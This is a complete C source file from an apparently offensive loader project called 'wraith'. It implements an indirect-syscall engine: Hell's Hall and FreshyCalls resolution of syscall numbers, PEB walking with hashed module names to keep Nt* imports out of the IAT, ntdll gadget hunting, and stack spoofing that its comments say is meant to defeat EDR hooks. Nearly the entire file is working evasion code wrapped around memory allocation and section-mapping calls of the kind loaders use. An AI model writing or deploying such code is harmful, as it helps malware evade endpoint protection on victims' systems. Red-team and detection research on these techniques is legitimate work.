/*
 * src/syscalls/sc_engine.c
 *
 * Engine glue: at first use, populate the SSN slots and the gadget
 * pointer that the asm stubs read. If either resolution fails, fall
 * back to direct function pointers (still resolved through the PEB
 * walker so we don't pollute the IAT with Nt* names).
 *
 * Once initialized, the typed wrappers (wr_sc_call_*) make a single
 * branch decision (HELLS_HALL or FALLBACK) and forward the call.
 */

#include "core/wr_ptr_check.h"
#include "runtime/rt_pebwalk.h"
#include "runtime/rt_resolver.h"
#include "stealth/hashing/hash_djb2.h"
#include "syscalls/sc_engine.h"
#include "syscalls/sc_gadget_finder.h"
#include "syscalls/sc_ssn_resolver.h"

#include <stdatomic.h>
#include <windows.h>

/* Globals defined in the asm trampoline. */
extern void  *g_gadget;
extern void  *g_ret_gadget;
extern uint32_t ssn_NtAllocateVirtualMemory;
extern uint32_t ssn_NtProtectVirtualMemory;
extern uint32_t ssn_NtFreeVirtualMemory;
extern uint32_t ssn_NtFlushInstructionCache;
extern uint32_t ssn_NtCreateSection;
extern uint32_t ssn_NtMapViewOfSection;
extern uint32_t ssn_NtUnmapViewOfSection;
extern uint32_t ssn_NtClose;

extern NTSTATUS NTAPI wr_sc_stub_NtAllocateVirtualMemory(
  HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_NtProtectVirtualMemory(
  HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
extern NTSTATUS NTAPI wr_sc_stub_NtFreeVirtualMemory(
  HANDLE, PVOID *, PSIZE_T, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_NtFlushInstructionCache(
  HANDLE, PVOID, SIZE_T);
extern NTSTATUS NTAPI wr_sc_stub_NtCreateSection(
  PHANDLE, ULONG, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
extern NTSTATUS NTAPI wr_sc_stub_NtMapViewOfSection(
  HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
  PSIZE_T, DWORD, ULONG, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_NtUnmapViewOfSection(HANDLE, PVOID);
extern NTSTATUS NTAPI wr_sc_stub_NtClose(HANDLE);

/* Stack-spoofing variants. */
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtAllocateVirtualMemory(
  HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtProtectVirtualMemory(
  HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtFreeVirtualMemory(
  HANDLE, PVOID *, PSIZE_T, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtFlushInstructionCache(
  HANDLE, PVOID, SIZE_T);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtCreateSection(
  PHANDLE, ULONG, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtMapViewOfSection(
  HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
  PSIZE_T, DWORD, ULONG, ULONG);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtUnmapViewOfSection(HANDLE, PVOID);
extern NTSTATUS NTAPI wr_sc_stub_spoof_NtClose(HANDLE);

/* Per-thread "use spoofed stubs?" toggle. Set by the runtime layer
 * (rt_api.c) when WRAITH_F_STACK_SPOOF is set on the current load. The
 * dispatch macro below picks the spoofed asm stub when this is on
 * AND the engine is in HELLS_HALL mode. */
#if defined(__GNUC__) || defined(__clang__)
#  define WRAITH_TLS __thread
#elif defined(_MSC_VER)
#  define WRAITH_TLS __declspec(thread)
#else
#  define WRAITH_TLS
#endif
static WRAITH_TLS int g_thread_use_spoof = 0;

/* Process-wide "is CET user-shadow-stack active?" flag.
 *
 * Stack spoofing pushes a synthetic return address onto the user stack
 * only. On a CET-enabled process the CPU also maintains a shadow stack
 * that the original CALL updated; the first `ret` after our `push`
 * compares user-stack top (fake_ret) against shadow-stack top
 * (real_ret), the mismatch raises #CP, and the kernel terminates the
 * process via FailFast - no SEH handler can intercept it.
 *
 * Detection runs once at engine init via GetProcessMitigationPolicy
 * (Win10 1607+). When the flag is set, every dispatch silently falls
 * back to the non-spoofed asm stub regardless of what the load
 * options requested. This is the auto-degradation path: callers ask
 * for STACK_SPOOF, we deliver as much stealth as the host environment
 * allows. */
static atomic_int g_cet_user_shadow_stack = 0;

void wr_sc_engine_set_thread_spoof(int enabled);
void wr_sc_engine_set_thread_spoof(int enabled)
{
  /* Refuse to arm the per-thread spoof toggle when CET would crash
   * the process on the first ret. The TLS write itself is harmless,
   * but storing 0 here keeps wraith_stackspoof_probe and any
   * downstream telemetry consistent ("spoof not active" rather than
   * "spoof requested but engine refused"). */
  if (enabled && atomic_load(&g_cet_user_shadow_stack)) {
  g_thread_use_spoof = 0;
  return;
  }
  g_thread_use_spoof = enabled ? 1 : 0;
}

int wr_sc_engine_cet_active(void);
int wr_sc_engine_cet_active(void)
{
  return atomic_load(&g_cet_user_shadow_stack) ? 1 : 0;
}

/* Direct fallback pointers (resolved via PEB walk + export resolver). */
typedef NTSTATUS (NTAPI *fn_NtAllocateVirtualMemory)(
  HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtProtectVirtualMemory)(
  HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtFreeVirtualMemory)(
  HANDLE, PVOID *, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *fn_NtFlushInstructionCache)(
  HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
  PHANDLE, ULONG, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtMapViewOfSection)(
  HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
  PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

static struct {
  fn_NtAllocateVirtualMemory  alloc;
  fn_NtProtectVirtualMemory  protect;
  fn_NtFreeVirtualMemory  freevm;
  fn_NtFlushInstructionCache  flush;
  fn_NtCreateSection  create_section;
  fn_NtMapViewOfSection  map_view;
  fn_NtUnmapViewOfSection  unmap_view;
  fn_NtClose  close;
} g_direct;

static atomic_int g_init_done = 0;
static atomic_int g_init_lock = 0;
static wr_sc_mode g_mode  = WRAITH_SC_MODE_UNINITIALIZED;

/* Runtime diagnostic override. When non-zero, dispatch always picks
 * the direct fallback path regardless of g_mode. Set via
 * wr_sc_engine_force_fallback. Atomic so callers can flip it from
 * any thread without an init re-run. */
static atomic_int g_forced_fallback = 0;

void wr_sc_engine_force_fallback(int enable)
{
  atomic_store(&g_forced_fallback, enable ? 1 : 0);
}

wr_sc_mode wr_sc_engine_mode(void)
{
  return g_mode;
}

wraith_status_t wr_sc_engine_inspect(wr_sc_engine_info *out)
{
  if (!out) {
  return WRAITH_E_NULL_ARG;
  }
  /* Make sure the engine has run init at least once. */
  (void)wr_sc_engine_init();

  out->mode          = (int)g_mode;
  out->gadget        = g_gadget;
  out->ret_gadget    = g_ret_gadget;
  out->gadget_valid  = wr_looks_like_valid_base(g_gadget) ? 1 : 0;

  out->hh_ssn[0] = ssn_NtAllocateVirtualMemory;
  out->hh_ssn[1] = ssn_NtProtectVirtualMemory;
  out->hh_ssn[2] = ssn_NtFreeVirtualMemory;
  out->hh_ssn[3] = ssn_NtFlushInstructionCache;
  out->hh_ssn[4] = ssn_NtCreateSection;
  out->hh_ssn[5] = ssn_NtMapViewOfSection;
  out->hh_ssn[6] = ssn_NtUnmapViewOfSection;
  out->hh_ssn[7] = ssn_NtClose;

  out->names[0] = "NtAllocateVirtualMemory";
  out->names[1] = "NtProtectVirtualMemory";
  out->names[2] = "NtFreeVirtualMemory";
  out->names[3] = "NtFlushInstructionCache";
  out->names[4] = "NtCreateSection";
  out->names[5] = "NtMapViewOfSection";
  out->names[6] = "NtUnmapViewOfSection";
  out->names[7] = "NtClose";

  /* Re-compute via FreshyCalls so the caller can compare element-wise.
  * If ntdll lookup fails, leave fc_ssn zeroed - callers should treat
  * 0 as "n/a" rather than as a divergence flag. */
  for (int i = 0; i < 8; ++i) out->fc_ssn[i] = 0;
  void *ntdll = NULL;
  if (wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"), &ntdll) == WRAITH_OK
      && wr_looks_like_valid_base(ntdll)) {
  for (int i = 0; i < 8; ++i) {
  uint32_t v = 0;
  if (wr_sc_resolve_ssn_by_rva(ntdll, out->names[i], &v) == WRAITH_OK) {
  out->fc_ssn[i] = v;
  }
  }
  }
  return WRAITH_OK;
}

static int try_resolve_one(void *ntdll, const char *name, uint32_t *slot)
{
  uint32_t s = 0;
  if (wr_sc_resolve_ssn(ntdll, name, &s) == WRAITH_OK) {
  *slot = s;
  return 1;
  }
  return 0;
}

/* Resolve one Nt* function pointer, validating the result before
 * storing. Any of these returning a sub-page address would later be
 * called by WRAITH_SC_DISPATCH's fallback branch and crash at the
 * indirect call site. */
static wraith_status_t resolve_one_direct(void *ntdll, const char *name,
                                           void **out_fn)
{
  void *p = NULL;
  if (wr_resolver_lookup_a(ntdll, name, &p) != WRAITH_OK
      || !wr_looks_like_valid_base(p)) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  *out_fn = p;
  return WRAITH_OK;
}

static wraith_status_t resolve_direct_fallback(void *ntdll)
{
  if (!wr_looks_like_valid_base(ntdll)) {
  return WRAITH_E_NULL_ARG;
  }
  wraith_status_t rc;
  rc = resolve_one_direct(ntdll, "NtAllocateVirtualMemory",
                           (void **)&g_direct.alloc);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtProtectVirtualMemory",
                           (void **)&g_direct.protect);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtFreeVirtualMemory",
                           (void **)&g_direct.freevm);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtFlushInstructionCache",
                           (void **)&g_direct.flush);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtCreateSection",
                           (void **)&g_direct.create_section);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtMapViewOfSection",
                           (void **)&g_direct.map_view);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtUnmapViewOfSection",
                           (void **)&g_direct.unmap_view);
  if (rc != WRAITH_OK) return rc;
  rc = resolve_one_direct(ntdll, "NtClose", (void **)&g_direct.close);
  if (rc != WRAITH_OK) return rc;
  return WRAITH_OK;
}

/* Wine emulates ntdll in user-mode, but the user-mode `syscall`
 * instruction issued from inside wine's ntdll goes straight to the
 * Linux kernel, which interprets RAX as a Linux syscall number rather
 * than dispatching it to wine. Hell's Hall is therefore non-functional
 * under wine even though all the patterns (prologue, gadget) match.
 *
 * Detection: wine's ntdll exports `wine_get_version`. Presence of that
 * symbol forces the engine into FALLBACK mode regardless of resolution
 * success - tests under wine64 still exercise the rest of the engine
 * (resolver, gadget finder) but the call path uses the direct function
 * pointers, which wine does dispatch correctly. */
static int detect_wine(void *ntdll)
{
  void *p = NULL;
  return wr_resolver_lookup_a(ntdll, "wine_get_version", &p) == WRAITH_OK;
}

/* CET user-shadow-stack probe.
 *
 * Calls GetProcessMitigationPolicy(ProcessUserShadowStackPolicy) on the
 * current process. Returns 1 when EnableUserShadowStack is set,
 * otherwise 0. The function is resolved dynamically so the wraith
 * binary still loads on Win7/Win8/Win10-pre-1607 hosts where the API
 * doesn't exist (probe degrades to "CET off, allow spoof").
 *
 * The MitigationPolicy enum and PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY
 * struct are in winnt.h since the MinGW-w64 headers we build against. */
static int probe_cet_user_shadow_stack(void)
{
  typedef BOOL (WINAPI *fn_GetProcMit)(HANDLE, PROCESS_MITIGATION_POLICY,
                                       PVOID, SIZE_T);
  HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
  if (!k32) {
  return 0;
  }
  fn_GetProcMit get = (fn_GetProcMit)(void *)GetProcAddress(
      k32, "GetProcessMitigationPolicy");
  if (!get) {
  return 0;
  }
  PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY pol;
  ZeroMemory(&pol, sizeof(pol));
  if (!get(GetCurrentProcess(), ProcessUserShadowStackPolicy,
           &pol, sizeof(pol))) {
  return 0;
  }
  return pol.EnableUserShadowStack ? 1 : 0;
}

wraith_status_t wr_sc_engine_init(void)
{
  if (atomic_load(&g_init_done)) {
  return WRAITH_OK;
  }
  /* Tiny spinlock - init is one-shot and rare. */
  int expected = 0;
  while (!atomic_compare_exchange_weak(&g_init_lock, &expected, 1)) {
  expected = 0;
  }
  if (atomic_load(&g_init_done)) {
  atomic_store(&g_init_lock, 0);
  return WRAITH_OK;
  }

  void *ntdll = NULL;
  wraith_status_t rc = wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"), &ntdll);
  if (rc != WRAITH_OK || !wr_looks_like_valid_base(ntdll)) {
  atomic_store(&g_init_lock, 0);
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }

  /* Always resolve the fallback path first - it's our safety net. */
  rc = resolve_direct_fallback(ntdll);
  if (rc != WRAITH_OK) {
  atomic_store(&g_init_lock, 0);
  return rc;
  }

  int alloc_ok  = try_resolve_one(ntdll, "NtAllocateVirtualMemory",
  &ssn_NtAllocateVirtualMemory);
  int protect_ok = try_resolve_one(ntdll, "NtProtectVirtualMemory",
  &ssn_NtProtectVirtualMemory);
  int free_ok  = try_resolve_one(ntdll, "NtFreeVirtualMemory",
  &ssn_NtFreeVirtualMemory);
  int flush_ok  = try_resolve_one(ntdll, "NtFlushInstructionCache",
  &ssn_NtFlushInstructionCache);
  int csec_ok  = try_resolve_one(ntdll, "NtCreateSection",
  &ssn_NtCreateSection);
  int mview_ok  = try_resolve_one(ntdll, "NtMapViewOfSection",
  &ssn_NtMapViewOfSection);
  int uview_ok  = try_resolve_one(ntdll, "NtUnmapViewOfSection",
  &ssn_NtUnmapViewOfSection);
  int close_ok  = try_resolve_one(ntdll, "NtClose", &ssn_NtClose);

  /* Cross-validate against FreshyCalls (sort-by-RVA, immune to inline
  * hooks). Whenever the two methods disagree, prefer FreshyCalls -
  * the disagreement means the prologue we read in tier 1 / 2 was
  * mutated by an EDR hook and the SSN we got is wrong.
  *
  * Cost: ntdll has ~470 Nt-exports; the qsort runs sub-millisecond
  * per call. We invoke it once per syscall slot here at init time
  * (8 calls) so the per-load overhead is bounded and one-shot. */
  struct {
  const char *name;
  uint32_t   *slot;
  int         resolved;
  } slots[] = {
  { "NtAllocateVirtualMemory", &ssn_NtAllocateVirtualMemory, alloc_ok },
  { "NtProtectVirtualMemory",  &ssn_NtProtectVirtualMemory,  protect_ok },
  { "NtFreeVirtualMemory",     &ssn_NtFreeVirtualMemory,     free_ok },
  { "NtFlushInstructionCache", &ssn_NtFlushInstructionCache, flush_ok },
  { "NtCreateSection",         &ssn_NtCreateSection,         csec_ok },
  { "NtMapViewOfSection",      &ssn_NtMapViewOfSection,      mview_ok },
  { "NtUnmapViewOfSection",    &ssn_NtUnmapViewOfSection,    uview_ok },
  { "NtClose",                 &ssn_NtClose,                 close_ok },
  };
  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); ++i) {
  uint32_t fc = 0;
  if (wr_sc_resolve_ssn_by_rva(ntdll, slots[i].name, &fc) != WRAITH_OK) {
  /* FreshyCalls failed for this name (very rare on real ntdll).
  * Trust whatever Hell's Hall / Halo's Gate produced. */
  continue;
  }
  if (!slots[i].resolved || *slots[i].slot != fc) {
  /* Either tier-1/2 failed, or it disagreed with FreshyCalls.
  * In both cases overwrite with the RVA-sort result. */
  *slots[i].slot = fc;
  if (!slots[i].resolved) {
  /* Mark this slot as resolved-via-fallback so the
  * viability check below counts it. */
  if (slots[i].slot == &ssn_NtAllocateVirtualMemory) alloc_ok = 1;
  else if (slots[i].slot == &ssn_NtProtectVirtualMemory) protect_ok = 1;
  else if (slots[i].slot == &ssn_NtFreeVirtualMemory) free_ok = 1;
  else if (slots[i].slot == &ssn_NtFlushInstructionCache) flush_ok = 1;
  else if (slots[i].slot == &ssn_NtCreateSection) csec_ok = 1;
  else if (slots[i].slot == &ssn_NtMapViewOfSection) mview_ok = 1;
  else if (slots[i].slot == &ssn_NtUnmapViewOfSection) uview_ok = 1;
  else if (slots[i].slot == &ssn_NtClose) close_ok = 1;
  }
  }
  }

  void *gadget = NULL;
  wraith_status_t gad_rc = wr_sc_find_syscall_gadget(ntdll, &gadget);
  if (gad_rc == WRAITH_OK && wr_looks_like_valid_base(gadget)) {
  g_gadget = gadget;
  /* The byte at gadget+2 is the `c3` (ret) of the canonical
  * `syscall; ret` sequence. It serves as a single-frame
  * stack-spoof gadget: a `ret`-only entrypoint inside ntdll. */
  g_ret_gadget = (uint8_t *)gadget + 2;
  } else {
  g_gadget = NULL;
  g_ret_gadget = NULL;
  }

  /* Hells Hall is only viable if every SSN slot has been populated
  * (non-zero) AND the gadget pointer survived validation. Any
  * partial-init failure forces the FALLBACK path, which routes
  * through the validated direct function pointers. */
  int ssns_ok = (ssn_NtAllocateVirtualMemory != 0
              && ssn_NtProtectVirtualMemory != 0
              && ssn_NtFreeVirtualMemory != 0
              && ssn_NtFlushInstructionCache != 0
              && ssn_NtCreateSection != 0
              && ssn_NtMapViewOfSection != 0
              && ssn_NtUnmapViewOfSection != 0
              && ssn_NtClose != 0);

  int hells_hall_viable = (alloc_ok && protect_ok && free_ok && flush_ok
  && csec_ok && mview_ok && uview_ok && close_ok
  && ssns_ok
  && gad_rc == WRAITH_OK
  && wr_looks_like_valid_base(g_gadget)
  && !detect_wine(ntdll));

  g_mode = hells_hall_viable ? WRAITH_SC_MODE_HELLS_HALL
  : WRAITH_SC_MODE_FALLBACK;

  /* Probe CET user-shadow-stack once. The dispatch macro reads this
   * flag on every call to decide whether to route through the spoofed
   * stub (incompatible with shadow stack) or the plain Hell's Hall
   * stub (compatible). */
  atomic_store(&g_cet_user_shadow_stack, probe_cet_user_shadow_stack());

  atomic_store(&g_init_done, 1);
  atomic_store(&g_init_lock, 0);
  return WRAITH_OK;
}

/* ------------------------------------------------------------------------
 * Typed wrappers
 * ------------------------------------------------------------------------ */

/* Single-return pattern below silences a spurious -Wreturn-type from
 * GCC 13's flow analyzer: it can't fully track that all branches of
 * the chained `if`s end in a return when one of the targets is an asm
 * stub declared `extern`. The behavior is identical. */

/* Dispatch macro: picks between spoofed asm stub, plain Hell's Hall
 * stub, and direct fallback function pointer based on engine mode +
 * the per-thread spoof toggle.
 *
 * stub_call  - regular Hell's Hall asm stub call expression
 * spoof_stub_call  - the same arguments routed to the spoofed stub
 * fallback_call  - direct ntdll function pointer call expression */
/* Even when g_mode == HELLS_HALL the dispatch refuses to enter the
 * asm stubs unless `g_gadget` is a sane address. This is a belt-and-
 * suspenders check on top of the init-time validation: a torn write
 * by a debugger / TLS callback / EDR thread could in principle
 * NULL out the global between init and dispatch, and a JMP through
 * a near-NULL pointer would otherwise crash with FaultAddress in
 * the [0..0x10000) range that's hard to attribute. */
#define WRAITH_SC_DISPATCH(stub_call, spoof_stub_call, fallback_call)  \
  NTSTATUS r = (NTSTATUS)0xC0000001;  \
  if (wr_sc_engine_init() == WRAITH_OK) {  \
  int _force_fb = atomic_load(&g_forced_fallback);  \
  if (!_force_fb && g_mode == WRAITH_SC_MODE_HELLS_HALL  \
      && wr_looks_like_valid_base(g_gadget)) {  \
  if (g_thread_use_spoof  \
      && !atomic_load(&g_cet_user_shadow_stack)  \
      && wr_looks_like_valid_base(g_ret_gadget)) {  \
  r = (spoof_stub_call);  \
  } else {  \
  r = (stub_call);  \
  }  \
  } else {  \
  r = (fallback_call);  \
  }  \
  }  \
  return r

NTSTATUS wr_sc_call_NtAllocateVirtualMemory(HANDLE p, PVOID *base,
  ULONG_PTR zb, PSIZE_T sz,
  ULONG type, ULONG prot)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtAllocateVirtualMemory(p, base, zb, sz, type, prot),
  wr_sc_stub_spoof_NtAllocateVirtualMemory(p, base, zb, sz, type, prot),
  g_direct.alloc(p, base, zb, sz, type, prot));
}

NTSTATUS wr_sc_call_NtProtectVirtualMemory(HANDLE p, PVOID *base,
  PSIZE_T sz, ULONG newp,
  PULONG oldp)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtProtectVirtualMemory(p, base, sz, newp, oldp),
  wr_sc_stub_spoof_NtProtectVirtualMemory(p, base, sz, newp, oldp),
  g_direct.protect(p, base, sz, newp, oldp));
}

NTSTATUS wr_sc_call_NtFreeVirtualMemory(HANDLE p, PVOID *base,
  PSIZE_T sz, ULONG type)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtFreeVirtualMemory(p, base, sz, type),
  wr_sc_stub_spoof_NtFreeVirtualMemory(p, base, sz, type),
  g_direct.freevm(p, base, sz, type));
}

NTSTATUS wr_sc_call_NtFlushInstructionCache(HANDLE p, PVOID base, SIZE_T sz)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtFlushInstructionCache(p, base, sz),
  wr_sc_stub_spoof_NtFlushInstructionCache(p, base, sz),
  g_direct.flush(p, base, sz));
}

NTSTATUS wr_sc_call_NtCreateSection(PHANDLE out_section, ULONG access,
  PVOID oa, PLARGE_INTEGER max_size,
  ULONG page_prot, ULONG alloc_attr,
  HANDLE file)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtCreateSection(out_section, access, oa, max_size,
  page_prot, alloc_attr, file),
  wr_sc_stub_spoof_NtCreateSection(out_section, access, oa, max_size,
  page_prot, alloc_attr, file),
  g_direct.create_section(out_section, access, oa, max_size,
  page_prot, alloc_attr, file));
}

NTSTATUS wr_sc_call_NtMapViewOfSection(HANDLE section, HANDLE process,
  PVOID *base, ULONG_PTR zb,
  SIZE_T commit_sz,
  PLARGE_INTEGER offset,
  PSIZE_T view_sz, DWORD inherit,
  ULONG alloc_type, ULONG win32_prot)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtMapViewOfSection(section, process, base, zb,
  commit_sz, offset, view_sz,
  inherit, alloc_type, win32_prot),
  wr_sc_stub_spoof_NtMapViewOfSection(section, process, base, zb,
  commit_sz, offset, view_sz,
  inherit, alloc_type, win32_prot),
  g_direct.map_view(section, process, base, zb, commit_sz, offset,
  view_sz, inherit, alloc_type, win32_prot));
}

NTSTATUS wr_sc_call_NtUnmapViewOfSection(HANDLE process, PVOID base)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtUnmapViewOfSection(process, base),
  wr_sc_stub_spoof_NtUnmapViewOfSection(process, base),
  g_direct.unmap_view(process, base));
}

NTSTATUS wr_sc_call_NtClose(HANDLE handle)
{
  WRAITH_SC_DISPATCH(
  wr_sc_stub_NtClose(handle),
  wr_sc_stub_spoof_NtClose(handle),
  g_direct.close(handle));
}

/* Public probe (declared in wraith_stealth.h). */
wraith_status_t wraith_stackspoof_probe(void)
{
  wraith_status_t rc = wr_sc_engine_init();
  if (rc != WRAITH_OK) {
  return rc;
  }
  if (g_mode != WRAITH_SC_MODE_HELLS_HALL || g_ret_gadget == NULL) {
  return WRAITH_E_STEALTH_INCOMPATIBLE;
  }
  /* CET user-shadow-stack incompatibility: the spoof would crash on
   * the first ret. Surface it as STEALTH_INCOMPATIBLE so callers can
   * treat the probe response as authoritative. */
  if (atomic_load(&g_cet_user_shadow_stack)) {
  return WRAITH_E_STEALTH_INCOMPATIBLE;
  }
  return WRAITH_OK;
}
